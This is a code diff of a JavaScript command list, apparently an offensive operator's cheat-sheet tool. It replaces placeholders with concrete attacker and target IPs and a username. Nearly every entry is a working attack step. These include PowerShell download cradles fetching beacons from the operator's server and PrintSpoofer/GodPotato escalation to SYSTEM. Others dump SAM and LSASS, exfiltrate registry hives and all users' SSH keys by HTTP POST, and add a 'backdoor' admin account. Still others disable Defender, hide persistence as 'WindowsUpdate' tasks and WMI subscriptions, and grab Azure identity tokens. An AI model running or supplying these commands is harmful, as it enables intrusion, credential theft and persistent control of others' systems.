+    desc: "Opens port in UFW firewall. Change 9999 to needed port. Run before starting new services.",
     code: "ufw allow 9999",
     tags: ["linux", "vps", "firewall"],
     accent: "#00ff41"
   },
   {
     title: "VPS - HTTP Server (any port)",
+    desc: "Starts Python HTTP server on port 9999. Serves files from current directory. Ctrl+C to stop.",
     code: "python3 -m http.server 9999",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "VPS - Kill Process on Port",
+    desc: "Kills whatever is using port 8080. Use when port already in use error. Change port as needed.",
     code: "fuser -k 8080/tcp",
     tags: ["linux", "vps"],
     accent: "#00ff41"
   },
   {
     title: "VPS - What's on Port",
+    desc: "Shows process using port 8080. Use to check what service is running on a port.",
     code: "lsof -i :8080",
     tags: ["linux", "vps", "recon"],
     accent: "#00ff41"
   },
   {
     title: "VPS - NC Listener",
+    desc: "Netcat listener on port 4444. Catches raw shells. Use c2_multi_v2.py for beacon shells.",
     code: "nc -lvnp 4444",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "VPS - NC File Receiver",
+    desc: "Receives file via netcat. On target: 'nc VPS_IP 9999 < file.txt'. File saves to received_file.txt.",
     code: "nc -lvnp 9999 > received_file.txt",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "Download from VPS",
+    desc: "Downloads file using PowerShell. Change filename and port as needed. -UseBasicParsing avoids IE dependency.",
     code: "IWR -Uri 'http://168.144.166.97:8080/file.exe' -OutFile C:\\Windows\\Temp\\file.exe -UseBasicParsing",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Download via Certutil",
+    desc: "LOLBin download method. Certutil is trusted Windows binary. May evade some AV. Leaves URL in cache.",
     code: "certutil -urlcache -split -f http://168.144.166.97:8080/file.exe C:\\Windows\\Temp\\file.exe",
     tags: ["cmd", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "Download via Bitsadmin",
+    desc: "Background Intelligent Transfer Service download. Runs as background job. Another LOLBin method.",
     code: "bitsadmin /transfer job /download /priority high http://168.144.166.97:8080/file.exe C:\\Windows\\Temp\\file.exe",
     tags: ["cmd", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "Check Proxy Settings",
+    desc: "Shows system proxy configuration. Important for payloads - may need to use proxy for callbacks.",
     code: "netsh winhttp show proxy",
     tags: ["cmd", "recon", "firewall"],
     accent: "#00f0ff"
   },
   {
     title: "Bypass Proxy (Direct)",
+    desc: "Disables proxy for current PowerShell session. Use when proxy blocks C2 traffic.",
     code: "[System.Net.WebRequest]::DefaultWebProxy = $null",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "[PRIVESC-1] Encode Beacon Download",
+    desc: "Encodes beacon download command to Base64. Copy output and use with -enc flag in PrintSpoofer/GodPotato.",
     code: "$cmd = 'IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC-2] VPS Serve Beacon",
-    code: "cd / && python3 -m http.server 8889",
+    desc: "Start HTTP server on VPS to serve beacon.ps1. Run from /opt where beacon file is.",
+    code: "cd /opt && python3 -m http.server 8889",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "[PRIVESC-3] PrintSpoofer SYSTEM Shell",
-    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
+    desc: "Executes encoded payload as SYSTEM. Replace BASE64_HERE with output from PRIVESC-1.",
+    code: "C:\\Windows\\Temp\\ps.exe -c \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
     tags: ["cmd", "privesc", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] Download PrintSpoofer",
-    code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\\\Windows\\\\Temp\\\\ps.exe -UseBasicParsing",
+    desc: "Downloads PrintSpoofer exploit to target. Works on Server 2016/2019 with SeImpersonate.",
+    code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\Windows\\Temp\\ps.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] Download GodPotato",
-    code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\\\Windows\\\\Temp\\\\gp.exe -UseBasicParsing",
+    desc: "Downloads GodPotato exploit. Works on newer Windows versions. Uses -cmd flag not -c.",
+    code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\Windows\\Temp\\gp.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] GodPotato SYSTEM Shell",
-    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
+    desc: "Executes encoded payload as SYSTEM using GodPotato. Replace BASE64_HERE with encoded command.",
+    code: "C:\\Windows\\Temp\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc BASE64_HERE\"",
     tags: ["cmd", "privesc", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] Check SeImpersonate",
+    desc: "First step in potato attacks. If SeImpersonate shows Enabled, proceed with PrintSpoofer/GodPotato.",
     code: "whoami /priv | findstr SeImpersonate",
     tags: ["cmd", "privesc", "recon"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] PrintSpoofer Add Admin",
-    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"net localgroup administrators USERNAME /add\"",
+    desc: "Adds user to local Administrators group as SYSTEM. Replace USERNAME with target user.",
+    code: "C:\\Windows\\Temp\\ps.exe -c \"net localgroup administrators adminvm1 /add\"",
     tags: ["cmd", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] PrintSpoofer Dump SAM",
-    code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\"\nC:\\\\Windows\\\\Temp\\\\ps.exe -c \"reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\"",
+    desc: "Dumps SAM and SYSTEM registry hives as SYSTEM. Required for hash extraction.",
+    code: "C:\\Windows\\Temp\\ps.exe -c \"reg save HKLM\\SAM C:\\Windows\\Temp\\sam\"\nC:\\Windows\\Temp\\ps.exe -c \"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys\"",
     tags: ["cmd", "privesc", "postexploit"],
     accent: "#9b59b6"
   },
   {
     title: "[PRIVESC] VPS Get Potato Tools",
-    code: "cd /opt\\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
+    desc: "Downloads both PrintSpoofer and GodPotato to VPS /opt directory. One-time setup.",
+    code: "cd /opt\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
     tags: ["linux", "vps", "privesc"],
     accent: "#00ff41"
   },
   {
     title: "[CHAIN] Full SeImpersonate to SYSTEM",
-    code: "# 1. Check privs: whoami /priv | findstr SeImpersonate\\n# 2. Download: IWR http://VPS:8889/PrintSpoofer.exe -OutFile C:\\\\Temp\\\\ps.exe\\n# 3. Encode: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(IWR http://VPS:8889/beacon.ps1)'))\\n# 4. Execute: C:\\\\Temp\\\\ps.exe -c 'powershell -enc BASE64'\\n# 5. Catch SYSTEM shell on C2",
+    desc: "Reference: Complete potato attack chain from check to SYSTEM shell. Follow steps in order.",
+    code: "# 1. Check privs: whoami /priv | findstr SeImpersonate\n# 2. Download: IWR http://168.144.166.97:8889/PrintSpoofer.exe -OutFile C:\\Temp\\ps.exe\n# 3. Encode: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(IWR http://168.144.166.97:8889/beacon.ps1)'))\n# 4. Execute: C:\\Temp\\ps.exe -c 'powershell -enc BASE64'\n# 5. Catch SYSTEM shell on C2",
     tags: ["playbook", "privesc"],
     accent: "#ffeb3b"
   },
   {
     title: "Encode Any Command",
+    desc: "Encodes any PowerShell command to Base64. Replace YOUR_COMMAND_HERE with your payload.",
     code: "$cmd = 'YOUR_COMMAND_HERE'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Decode Base64 Command",
+    desc: "Decodes Base64 string back to readable command. Use to inspect suspicious encoded commands.",
     code: "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64_HERE'))",
     tags: ["ps", "evasion"],
     accent: "#e91e63"
   },
   {
     title: "Run Encoded Command",
+    desc: "Executes Base64 encoded PowerShell. -w hidden = no window. -ep bypass = skip execution policy.",
     code: "powershell -ep bypass -w hidden -enc BASE64_HERE",
     tags: ["cmd", "evasion", "c2"],
     accent: "#e91e63"
   },
   {
     title: "IEX Download Cradle",
+    desc: "Downloads and executes PowerShell script in memory. Nothing written to disk. Classic stager.",
     code: "IEX(IWR http://168.144.166.97:8889/script.ps1 -UseBasicParsing)",
     tags: ["ps", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "IEX via Variable",
+    desc: "Same as above but URL in variable. Slightly evades simple string detection.",
     code: "$u='http://168.144.166.97:8889/script.ps1'; IEX(IWR $u -UseBasicParsing)",
     tags: ["ps", "c2", "evasion"],
     accent: "#ff6b35"
   },
   {
     title: "[TROUBLESHOOT] Test Beacon Download",
+    desc: "Tests if beacon downloads and executes. Should connect to C2. Run manually to debug connection issues.",
     code: "IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)",
     tags: ["ps", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
     title: "[TROUBLESHOOT] Test HTTP Server",
+    desc: "Downloads beacon without executing. Check if file content returns. If error, HTTP server not running.",
     code: "IWR -Uri 'http://168.144.166.97:8889/beacon.ps1' -UseBasicParsing",
     tags: ["ps", "c2", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "[TROUBLESHOOT] GodPotato Verify SYSTEM",
-    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"whoami > C:\\\\Windows\\\\Temp\\\\proof.txt\"\\ntype C:\\\\Windows\\\\Temp\\\\proof.txt",
+    desc: "Tests if GodPotato works. Should write 'nt authority\\system' to proof.txt. Debug potato issues.",
+    code: "C:\\Windows\\Temp\\gp.exe -cmd \"whoami > C:\\Windows\\Temp\\proof.txt\"\ntype C:\\Windows\\Temp\\proof.txt",
     tags: ["cmd", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "[TROUBLESHOOT] GodPotato Beacon",
-    code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\"",
+    desc: "Runs beacon directly through GodPotato without encoding. Good for testing before using -enc.",
+    code: "C:\\Windows\\Temp\\gp.exe -cmd \"powershell -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\"",
     tags: ["cmd", "privesc", "c2"],
     accent: "#9b59b6"
   },
   {
     title: "[TROUBLESHOOT] VPS Check Beacon File",
+    desc: "Verifies beacon.ps1 exists and is served correctly. Shows first lines of file.",
     code: "ls -la /opt/beacon.ps1 && curl http://localhost:8889/beacon.ps1 | head",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "[TROUBLESHOOT] VPS Copy Beacon",
+    desc: "Copies beacon to HTTP directory if missing. Run if beacon.ps1 not found in /opt.",
     code: "cp /beacon_persistent.ps1 /opt/beacon.ps1",
     tags: ["linux", "vps"],
     accent: "#00ff41"
   },
   {
     title: "[TROUBLESHOOT] VPS Check C2 Listening",
+    desc: "Verifies C2 handler is running on port 4444. If no output, start c2_multi_v2.py.",
     code: "ss -tlnp | grep 4444",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "[TROUBLESHOOT] C2 List Sessions",
+    desc: "Run inside C2 console. Lists all active beacon sessions. Use 'use N' to interact.",
     code: "sessions",
     tags: ["c2"],
     accent: "#ff6b35"
   },
   {
     title: "[POST-SYSTEM] Dump SAM/SYSTEM",
-    code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\\nreg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\\nreg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\sec",
+    desc: "Saves registry hives for offline hash extraction. Run each line. Requires SYSTEM privileges.",
+    code: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\sec",
     tags: ["cmd", "postexploit", "playbook"],
     accent: "#ff9800"
   },
   {
     title: "[POST-SYSTEM] Add Backdoor Admin",
-    code: "net user backdoor P@ssw0rd123! /add\\nnet localgroup administrators backdoor /add\\nnet localgroup 'Remote Desktop Users' backdoor /add",
+    desc: "Creates hidden admin account. Adds to Administrators and RDP groups. Change password as needed.",
+    code: "net user backdoor P@ssw0rd123! /add\nnet localgroup administrators backdoor /add\nnet localgroup 'Remote Desktop Users' backdoor /add",
     tags: ["cmd", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[POST-SYSTEM] Enable RDP",
-    code: "Set-ItemProperty -Path 'HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server' -Name fDenyTSConnections -Value 0\\nnetsh advfirewall firewall set rule group='remote desktop' new enable=yes",
+    desc: "Enables Remote Desktop on target. Opens firewall rule. Connect via mstsc.exe to 4.200.69.210.",
+    code: "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0\nnetsh advfirewall firewall set rule group='remote desktop' new enable=yes",
     tags: ["ps", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[POST-SYSTEM] Disable Defender",
-    code: "Set-MpPreference -DisableRealtimeMonitoring $true\\nSet-MpPreference -DisableBehaviorMonitoring $true\\nSet-MpPreference -DisableIOAVProtection $true",
+    desc: "Disables Windows Defender real-time protection. May require tamper protection bypass first.",
+    code: "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true",
     tags: ["ps", "defender", "evasion"],
     accent: "#ff2a6d"
   },
   {
     title: "[POST-SYSTEM] Add SSH Key",
-    code: "mkdir C:\\\\Users\\\\Administrator\\\\.ssh -Force\\nAdd-Content C:\\\\Users\\\\Administrator\\\\.ssh\\\\authorized_keys 'YOUR_PUBKEY'",
+    desc: "Adds your SSH public key for passwordless access. Replace YOUR_PUBKEY with actual key.",
+    code: "mkdir C:\\Users\\Administrator\\.ssh -Force\nAdd-Content C:\\Users\\Administrator\\.ssh\\authorized_keys 'YOUR_PUBKEY'",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "[POST-SYSTEM] SYSTEM Scheduled Task",
+    desc: "Creates boot-time scheduled task running as SYSTEM. Replace BASE64_BEACON with encoded payload.",
     code: "schtasks /create /tn 'WindowsUpdate' /tr 'powershell -w hidden -enc BASE64_BEACON' /sc onstart /ru SYSTEM /f",
     tags: ["cmd", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[POST-SYSTEM] Dump LSASS",
-    code: "rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\\\Windows\\\\Temp\\\\lsass.dmp full",
+    desc: "Dumps LSASS process memory for credential extraction. Use mimikatz/pypykatz to parse dump.",
+    code: "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "[POST-SYSTEM] Read All User Files",
-    code: "Get-ChildItem C:\\\\Users\\\\*\\\\Desktop -Recurse\\nGet-ChildItem C:\\\\Users\\\\*\\\\Documents -Recurse",
+    desc: "Lists all files on all user desktops and documents. Find sensitive data as SYSTEM.",
+    code: "Get-ChildItem C:\\Users\\*\\Desktop -Recurse\nGet-ChildItem C:\\Users\\*\\Documents -Recurse",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "[POST-SYSTEM] Exfil SAM to VPS",
-    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
+    desc: "POSTs SAM file to VPS exfil receiver. Run catch_all.py on VPS port 8083 first.",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "VPS Crack SAM Hashes",
+    desc: "Extracts NTLM hashes from SAM using impacket. Requires sam and sys files in current directory.",
     code: "secretsdump.py -sam sam -system sys LOCAL",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "Azure IMDS Instance Info",
+    desc: "Gets full Azure VM metadata as JSON. Shows subscription, resource group, network config, tags.",
     code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | ConvertTo-Json -Depth 10",
     tags: ["ps", "cloud", "recon"],
     accent: "#03a9f4"
   },
   {
     title: "Azure Managed Identity Token",
+    desc: "Gets ARM API token. Use with curl/IRM to call Azure management APIs. Token in access_token field.",
     code: "Invoke-RestMethod -Headers @{'Metadata'='true'} -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
     tags: ["ps", "cloud", "postexploit"],
     accent: "#03a9f4"
   },
   {
     title: "VPS HTTP Server Forever (systemd)",
-    code: "cat > /etc/systemd/system/http8889.service << 'EOF'\\n[Unit]\\nDescription=HTTP Server 8889\\nAfter=network.target\\n[Service]\\nType=simple\\nWorkingDirectory=/opt\\nExecStart=/usr/bin/python3 -m http.server 8889\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\nEOF\\nsystemctl daemon-reload && systemctl enable http8889 && systemctl start http8889",
+    desc: "Creates persistent systemd service for HTTP server. Auto-restarts on crash. Survives reboot.",
+    code: "cat > /etc/systemd/system/http8889.service << 'EOF'\n[Unit]\nDescription=HTTP Server 8889\nAfter=network.target\n[Service]\nType=simple\nWorkingDirectory=/opt\nExecStart=/usr/bin/python3 -m http.server 8889\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable http8889 && systemctl start http8889",
     tags: ["linux", "vps", "persist"],
     accent: "#00ff41"
   },
   {
     title: "VPS HTTP Server (nohup)",
+    desc: "Runs HTTP server in background. Survives terminal close but not reboot. Quick and dirty.",
     code: "cd /opt && nohup python3 -m http.server 8889 > /dev/null 2>&1 &",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "VPS HTTP Server (screen)",
+    desc: "Runs in detached screen session. 'screen -r http8889' to attach. 'screen -ls' to list.",
     code: "screen -dmS http8889 python3 -m http.server 8889",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
@@ -2637,37 +3006,43 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[SSH-THEFT] Exfil All SSH Keys to VPS",
-    code: "$out = ''; Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\* -ErrorAction SilentlyContinue | % { $out += \"`n=== $($_.FullName) ===`n\" + (Get-Content $_.FullName -Raw) }; IRM -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $out",
+    desc: "Collects ALL SSH keys from all users and sends to VPS. Gold for lateral movement to other boxes.",
+    code: "$out = ''; Get-ChildItem C:\\Users\\*\\.ssh\\* -ErrorAction SilentlyContinue | % { $out += \"`n=== $($_.FullName) ===`n\" + (Get-Content $_.FullName -Raw) }; IRM -Uri 'http://168.144.166.97:8083/sshkeys' -Method POST -Body $out",
     tags: ["ps", "postexploit", "persist", "playbook"],
     accent: "#e74c3c"
   },
   {
     title: "[SSH-THEFT] Find All Private Keys",
-    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\id_* -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\\\.pub$' }",
+    desc: "Lists private SSH keys (excludes .pub files). Check each user's .ssh directory.",
+    code: "Get-ChildItem C:\\Users\\*\\.ssh\\id_* -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\.pub$' }",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "[SSH-THEFT] Read Single Private Key",
-    code: "Get-Content C:\\\\Users\\\\Administrator\\\\.ssh\\\\id_ed25519",
+    desc: "Reads Administrator's ed25519 private key. Change path for other users/key types.",
+    code: "Get-Content C:\\Users\\Administrator\\.ssh\\id_ed25519",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "[SSH-THEFT] Check known_hosts (See Where They Connect)",
-    code: "Get-ChildItem C:\\\\Users\\\\*\\\\.ssh\\\\known_hosts -ErrorAction SilentlyContinue | % { Write-Host $_.FullName; Get-Content $_ }",
+    desc: "Shows hosts the target has SSH'd to. Reveals internal infrastructure and lateral targets.",
+    code: "Get-ChildItem C:\\Users\\*\\.ssh\\known_hosts -ErrorAction SilentlyContinue | % { Write-Host $_.FullName; Get-Content $_ }",
     tags: ["ps", "postexploit", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "VPS: Save Stolen Key",
-    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\\n...KEY_CONTENT...\\n-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/stolen_key && chmod 600 /root/.ssh/stolen_key",
+    desc: "Saves exfiltrated key on VPS. Replace KEY_CONTENT with actual key data. chmod 600 required.",
+    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\n...KEY_CONTENT...\n-----END OPENSSH PRIVATE KEY-----' > /root/.ssh/stolen_key && chmod 600 /root/.ssh/stolen_key",
     tags: ["linux", "vps", "persist"],
     accent: "#00ff41"
   },
   {
     title: "VPS: SSH Using Stolen Key",
-    code: "ssh -i /root/.ssh/stolen_key username@TARGET_IP",
+    desc: "Connects to target using stolen key. Replace username and TARGET_IP with actual values.",
+    code: "ssh -i /root/.ssh/stolen_key adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral"],
     accent: "#00ff41"
   },
@@ -2676,6 +3051,7 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[PERSIST-1] Scheduled Task as SYSTEM (Common)",
+    desc: "Creates boot-time scheduled task. Most common persistence. Replace BASE64_BEACON with encoded payload.",
     code: "schtasks /create /tn \"WindowsUpdate\" /tr \"powershell -w hidden -ep bypass -enc BASE64_BEACON\" /sc onstart /ru SYSTEM /f",
     tags: ["cmd", "persist", "playbook"],
     accent: "#e74c3c"
@@ -2690,7 +3066,7 @@ const COMMANDS = [
   {
     title: "[PERSIST-3] WMI Event Subscription (Hardest to Detect)",
     desc: "STEALTHIEST. Fires every 60 seconds when perf data changes. Survives reboots. Most AV/EDR misses it. Replace BASE64_BEACON with encoded payload.",
-    code: "$cmd = 'powershell -w hidden -ep bypass -enc BASE64_BEACON'\\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';EventNameSpace='root\\\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\\n$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\\\subscription' -Arguments @{Name='WinUpdate';CommandLineTemplate=$cmd}\\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\\\subscription' -Arguments @{Filter=$Filter;Consumer=$Consumer}",
+    code: "$cmd = 'powershell -w hidden -ep bypass -enc BASE64_BEACON'\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WinUpdate';EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}\n$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='WinUpdate';CommandLineTemplate=$cmd}\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=$Filter;Consumer=$Consumer}",
     tags: ["ps", "persist", "playbook"],
     accent: "#e74c3c"
   },
@@ -2711,28 +3087,28 @@ const COMMANDS = [
   {
     title: "[PERSIST] List WMI Subscriptions",
     desc: "Check for existing WMI persistence. Shows all filters and consumers. Look for names like 'WinUpdate' or suspicious commands.",
-    code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer",
+    code: "Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter\nGet-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer",
     tags: ["ps", "persist", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "[PERSIST] Remove WMI Persistence",
     desc: "Removes WMI persistence named 'WinUpdate'. Stops beacon spam from flooding C2. Change name if you used different one.",
-    code: "Get-WmiObject -Namespace 'root\\\\subscription' -Class __EventFilter | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\\nGet-WmiObject -Namespace 'root\\\\subscription' -Class __FilterToConsumerBinding | Remove-WmiObject",
+    code: "Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\nGet-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WinUpdate' } | Remove-WmiObject\nGet-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding | Remove-WmiObject",
     tags: ["ps", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[PERSIST] Registry Run Key (User-Level)",
     desc: "Runs payload when THIS USER logs in. HKCU = current user only. Less reliable - only fires on login, not boot.",
-    code: "reg add 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
+    code: "reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
     tags: ["cmd", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "[PERSIST] Registry Run Key (SYSTEM-Level)",
     desc: "Runs payload when ANY USER logs in. HKLM = all users. Requires Admin/SYSTEM to set. More reliable than HKCU.",
-    code: "reg add 'HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
+    code: "reg add 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v WindowsUpdate /t REG_SZ /d 'powershell -w hidden -enc BASE64' /f",
     tags: ["cmd", "persist"],
     accent: "#e74c3c"
   },
@@ -2770,14 +3146,14 @@ const COMMANDS = [
   {
     title: "[EXFIL] Send SYSTEM Hive to VPS",
     desc: "POSTs SYSTEM registry hive to VPS. REQUIRED with SAM - contains BOOTKEY to decrypt SAM hashes.",
-    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "[EXFIL] Send SECURITY Hive to VPS",
     desc: "POSTs SECURITY hive. Contains LSA secrets (cached domain creds, service account passwords). Optional but valuable.",
-    code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sec'); IRM -Uri 'http://168.144.166.97:8083/security' -Method POST -Body $s",
+    code: "$s = [IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sec'); IRM -Uri 'http://168.144.166.97:8083/security' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff6b35"
   },
@@ -2843,7 +3219,7 @@ const COMMANDS = [
   {
     title: "[CHAIN-6] Dump SAM/SYSTEM/SECURITY",
     desc: "Saves registry hives. Run each line. Need SYSTEM privs. Files save to C:\\Windows\\Temp\\.",
